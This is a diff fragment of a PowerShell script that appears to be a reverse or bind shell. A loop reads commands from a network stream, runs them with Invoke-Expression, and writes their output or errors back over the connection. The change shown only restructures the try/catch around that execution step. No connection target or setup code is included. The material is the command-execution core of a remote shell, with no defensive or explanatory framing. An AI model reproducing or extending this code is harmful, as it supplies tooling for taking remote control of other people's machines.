@@ -63,22 +63,18 @@ while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)
 	if ($Command.Substring(0, 1) -eq "/") { InvokeCustomCommands  $Command.Substring(1) }
 	else
 	{
-		
-		$Output =
+		$Output = try
 		{
-			try
-			{
-				Invoke-Expression $Command 2>&1 | Out-String
-			}
-			catch
-			{
-				$_ | Out-String
-			}
+			Invoke-Expression $Command 2>&1 | Out-String
 		}
+		catch
+		{
+			$_ | Out-String
+		}
+		
 		
 		WriteToStream ($Output)
 	}
-	
 }
 $StreamWriter.Close()
 Clear-Host
